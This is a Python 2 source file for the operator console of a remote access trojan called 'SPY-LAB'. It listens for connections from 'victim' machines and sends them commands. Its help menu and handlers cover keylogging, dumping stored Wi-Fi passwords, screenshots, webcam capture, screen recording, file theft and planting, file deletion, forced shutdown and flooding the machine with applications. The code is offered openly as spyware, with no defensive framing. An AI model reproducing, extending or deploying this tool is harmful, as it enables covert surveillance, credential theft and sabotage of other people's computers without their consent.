import socket
import os,sys,select,time
import cv2
import numpy as np
import pyautogui
import psutil
import plyer
import win10toast

print """
 .d88888b   888888ba  dP    dP          dP         .d888888   888888ba  
88.    "'  88    `8b Y8.  .8P          88        d8'    88   88    `8b 
`Y88888b. a88aaaa8P'  Y8aa8P           88        88aaaaa88a a88aaaa8P' 
      `8b  88           88    88888888 88        88     88   88   `8b. 
d8'   .8P  88           88             88        88     88   88    .88 
 Y88888P   dP           dP             88888888P 88     88   88888888P 
  """
HELP_TEXT = '''Command             | Description
---------------------------------------------------------------------------
download <file>     | Download file from client
cd                  | Go one directory to another
pic <img_name.jpg>  | Capture screenshot of client machine 
del <file>          | Delete file of target machine.
help_me             | Show this help menu.
quit                | Close the connection
wifipass            | Get all wifi password stored on target
survey              | To know all about target machine
keylogger           | To store keylogs in keylog.txt
popup <msg>         | To show custom popup message box on target machine
shutdown            | To shutdown the client machine
restart             | To Restart the client machine
logout              | To Logout from the client machine
sleepst             | To Standby or suspend the client machine
openfile            | To open a file in client machine
screen_rec          | To capture on-screen Activites and save the output
capture_ph          | To caputure photos using webcam continously
open_close_web      | To Open/Close webcam
notify              | To send a notfication on a client machine
write_msg           | To create a file on victim machine and write someting on file 
open_sw             | open different software according to different commands
close_sw            | close different software according to different commands
upload <filename>   | upload files on victim machine
fork                | Open lot's of application on victim machine

'''


print(HELP_TEXT)


host=raw_input("Enter host ip:")
port=input("Enter Host port:")
#host='0.0.0.0'
#port='666'
clear=lambda:os.system('cls')
c=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
c.bind((host,port))
c.listen(100)
active=False
clients=[]
socks=[]
interval=0.8
print '\nListening for clients.....\n'
print 'type "help_me" to see a list of commands.'


while True:
    try:
        c.settimeout(4)
        try:
            s,a=c.accept()
        except socket.timeout:
            continue
        if(a):
            s.settimeout(None)
            socks +=[s]
            clients +=[str(a)]
        clear()
        print '\nListening for clients....\n'
        if len(clients)>0:
            for j in range(0,len(clients)):
                print '['+str((j+1))+']client:'+clients[j]+'\n'
            print 'Press ctrl+C to interact with client.'
        time.sleep(interval)
    except KeyboardInterrupt:
        clear()
        print '\nListening for clients....\n'
        if len(clients)>0:
            for j in range(0,len(clients)):
                print '['+str((j+1))+']client:'+clients[j]+'\n'
            print "...\n"
            print "[0] Exit \n"
        activate=input('\nChoose client from Above list. 0=exit : ')
        if activate==0:
            print '\nExiting....\n'
            sys.exit()
        activate -=1
        clear()
        print'Activating client.'+clients[activate]+'\n'
        active=True
        socks[activate].send('dir')
    while active:
        data=socks[activate].recv(5000)
        print data
        if data.startswith('Exit')==True:
            active=False
            print 'Press ctrl+c to return to listener mode....'
        else:
            nextcmd=raw_input('SPY-LAB$ ')
            socks[activate].send(nextcmd)
        if nextcmd.startswith("download")== True:

            downFile=nextcmd[9:]
            try:
                f=open(downFile,'wb')
                print 'Downloading file',downFile
                while True:
                    l=socks[activate].recv(5000)
                    while 1:
                        if l.endswith('EOFEOFX'):
                            u=l[:-7]
                            f.write(u)
                            s.send("cls")
                            print "file downloaded"
                            break
                        elif l.startswith('EOFEOFX'):
                            break
                        else:
                            f.write(l)
                            l=socks[activate].recv(5000)
                    break
                f.close()
            except:
                pass
            #dir change function
        elif nextcmd.startswith("cd")== True:
            path=nextcmd[3:]
        
        #help
        elif nextcmd.startswith("help_me")==True:
            print(HELP_TEXT)
    # snapshot upload function
        elif nextcmd.startswith("pic")== True:
            jpg=nextcmd[4:]
            downFile=nextcmd[4:]
            time.sleep(2)
            try:
                f=open(downFile,'wb')
                print 'downloading file',downFile
                while True:
                    l=socks[activate].recv(512)
                    while 1:
                        if l.endswith('EOFEOFX'):
                            u=l[:-7]
                            f.write(u)
                            s.send("cls")
                            print "file downloaded"
                            break
                        elif l.startswith('EOFEOFX'):
                            break
                        else:
                            f.write(l)
                            l=socks[activate].recv(5000)
                    break
                f.close()
            except:
                pass 
    ######delete file
        elif nextcmd.startswith("del")== True:
            file=nextcmd[4:]
    #########shutdown
        elif nextcmd.startswith("shutdown")== True:
             socks[activate].send('shutdown')
    ######### send notification to victim machine
        elif nextcmd.startswith("notify")== True:
             try:
                 sys.stdout.write("Enter notification = ")
                 sys.stdout.flush()
                 no = sys.stdin.readline()
                 socks[activate].sendall(no)
                 socks[activate].send('notify')
                 
             except:
                 print "Error"
  ################fork      
        elif nextcmd.startswith("fork")== True:
             socks[activate].send('fork')        
    #########restart
        elif nextcmd.startswith("restart")== True:
             socks[activate].send('restart')
             
    #######logout 
        elif nextcmd.startswith("logout")== True:
             socks[activate].send('logout') 
    #######sleepst 
        elif nextcmd.startswith("sleepst")== True:
             socks[activate].send('sleepst') 
             
  ########## to open file on victim machin which have any extension 
        elif nextcmd.startswith("openfile")== True:
             socks[activate].send('openfile') 
             sys.stdout.write("Enter File Name= ")
             sys.stdout.flush()
             openf = sys.stdin.readline()
             socks[activate].sendall(openf)
                     
    ######### sreen recording
        elif data.startswith('screen_rec')==True:
             socks[activate].send('screen_rec')
                
     #########fork
        elif nextcmd.startswith("fork")== True:
             socks[activate].send('fork')     
             
    ######### capture photo from victim machine
        elif data.startswith('capture_ph')==True:
             socks[activate].send('capture_ph') 
             
     ######### show  process which running on victim machine
        elif data.startswith('show_ps')==True:
             socks[activate].send('show_ps')
             
        #######close software 
        elif data.startswith('close_sw_sw')==True:
             socks[activate].send('close_sw')
             
######### close other software in victim machine
        elif data.startswith('c_other')==True:
             socks[activate].send('c_other')
             
######### close chrome software in victim machine
        elif data.startswith('c_chrome')==True:
             socks[activate].send('c_chrome')

######### close cmd software in victim machine
        elif data.startswith('c_cmd')==True:
             socks[activate].send('c_cmd') 
             
######### close notepad software in victim machine
        elif data.startswith('c_notepad')==True:
             socks[activate].send('c_notepad')  

######### close notepad++ software in victim machine
        elif data.startswith('c_notepad++')==True:
             socks[activate].send('c_notepad++')    

######### close microsoft store software in victim machine
        elif data.startswith('c_strore')==True:
             socks[activate].send('c_strore') 

######### close skype software in victim machine
        elif data.startswith('c_skype')==True:
             socks[activate].send('c_skype')

######### close mail software in victim machine
        elif data.startswith('c_mail')==True:
             socks[activate].send('c_mail') 
######### close word software in victim machine
        elif data.startswith('c_word')==True:
             socks[activate].send('c_word') 

######### close excel software in victim machine
        elif data.startswith('c_excel')==True:
             socks[activate].send('c_excel') 

######### close office software in victim machine
        elif data.startswith('c_office')==True:
             socks[activate].send('c_office')
             
######### close ppt software in victim machine
        elif data.startswith('c_ppt')==True:
             socks[activate].send('c_ppt')
             
######### close paint software in victim machine
        elif data.startswith('c_paint')==True:
             socks[activate].send('c_paint')              

#########  close whatsapp software in victim machine
        elif data.startswith('c_whatsapp')==True:
             socks[activate].send('c_whatsapp++')    

######### close netflix software in victim machine
        elif data.startswith('c_netflix')==True:
             socks[activate].send('c_netflix') 

######### close android studio software in victim machine
        elif data.startswith('c_androids')==True:
             socks[activate].send('c_androids')

######### close java software in victim machine
        elif data.startswith('c_java')==True:
             socks[activate].send('c_java') 
######### close python software in victim machine
        elif data.startswith('c_python')==True:
             socks[activate].send('c_python') 

######### close firefox software in victim machine
        elif data.startswith('c_firefox')==True:
             socks[activate].send('c_firefox') 

#########   close xampp software in victim machine
        elif data.startswith('c_xampp')==True:
             socks[activate].send('c_xampp')        
                
             
#########   open software in victim machine
        elif data.startswith('open_sw')==True:
             socks[activate].send('open_sw')
             
#########   open other software in victim machine
        elif data.startswith('o_other')==True:
             socks[activate].send('o_other')
             
#########   open chrome software in victim machine
        elif data.startswith('o_chrome')==True:
             socks[activate].send('o_chrome')

#########   open cmd software in victim machine
        elif data.startswith('o_cmd')==True:
             socks[activate].send('o_cmd') 
             
#########  open notepad software in victim machine
        elif data.startswith('o_notepad')==True:
             socks[activate].send('o_notepad')  

#########   open notepad++ software in victim machine
        elif data.startswith('o_notepad++')==True:
             socks[activate].send('o_notepad++')    

#########   open store software in victim machine
        elif data.startswith('o_strore')==True:
             socks[activate].send('o_strore') 

######### open skype software in victim machine
        elif data.startswith('o_skype')==True:
             socks[activate].send('o_skype')

######### open mail software in victim machine
        elif data.startswith('o_mail')==True:
             socks[activate].send('o_mail') 
######### open word software in victim machine
        elif data.startswith('o_word')==True:
             socks[activate].send('o_word') 

######### open excel software in victim machine
        elif data.startswith('o_excel')==True:
             socks[activate].send('o_excel') 

######### open office software in victim machine
        elif data.startswith('o_office')==True:
             socks[activate].send('o_office')
             
######### open ppt software in victim machine
        elif data.startswith('o_ppt')==True:
             socks[activate].send('o_ppt')
             
######### open paint software in victim machine
        elif data.startswith('o_paint')==True:
             socks[activate].send('o_paint')              

#########   open whatsapp software in victim machine
        elif data.startswith('o_whatsapp')==True:
             socks[activate].send('o_whatsapp++')    

######### open netflix software in victim machine
        elif data.startswith('o_netflix')==True:
             socks[activate].send('o_netflix') 

######### open android studio software in victim machine
        elif data.startswith('o_androids')==True:
             socks[activate].send('o_androids')

######### open java software in victim machine
        elif data.startswith('o_java')==True:
             socks[activate].send('o_java') 
######### open python software in victim machine
        elif data.startswith('o_python')==True:
             socks[activate].send('o_python') 

######### open firefox software in victim machine
        elif data.startswith('o_firefox')==True:
             socks[activate].send('o_firefox') 

######### open xampp software in victim machine
        elif data.startswith('o_xampp')==True:
             socks[activate].send('o_xampp')   
             
    #######open and close the webcam of victim machine
        elif data.startswith('open_close_web')==True:
             socks[activate].send('open_close_web') 
             
    #######open and close the monitor
        elif data.startswith('oc_m')==True:
             socks[activate].send('oc_m') 
             
         
    #######create file on victim machine and write in file anything such as message,code etc
        elif nextcmd.startswith("write_msg")== True:
                    sys.stdout.write("Enter message here= ")
                    sys.stdout.flush()
                    a = sys.stdin.readline()
                    fd = os.open( "message.txt", os.O_RDWR|os.O_CREAT )
                    os.write(fd,a)
                    os.close(fd)
                    sendFile="message.txt"
                    sendFile=nextcmd[7:]
                    time.sleep(.8)
                    if os.path.isfile(sendFile):
                        fd = os.open( "message.txt", os.O_RDWR|os.O_CREAT )
                        os.write(fd,a)
                        os.close(fd)
                        with open("message.txt",'rb')as f:
                            while 1:
                                filedata=f.read()
                                if filedata=='':break
                                socks[activate].sendall(filedata)
                        f.close()
                        time.sleep(0.8)
                        socks[activate].sendall('EOFEOFX')
                    else:
                        print "Failed.. invalid file"
                        socks[activate].send('EOFEOFX')
                        pass
                  
                     
    #######show directory
        elif len(nextcmd)==0:
            socks[activate].send('dir')
    ####for invalid commadands 
        elif data.startswith('invalid')==True:
                    print "invalid filename"
                    
    ####upload system
        elif nextcmd.startswith('upload')==True:
            sendFile=nextcmd[7:]
            time.sleep(.8)
            if os.path.isfile(sendFile):
                with open(sendFile,'rb')as f:
                    while 1:
                        filedata=f.read()
                        if filedata=='':break
                        socks[activate].sendall(filedata)
                f.close()
                time.sleep(0.8)
                socks[activate].sendall('EOFEOFX')
            else:
                print "Failed.. invalid file"
                socks[activate].send('EOFEOFX')
                pass 
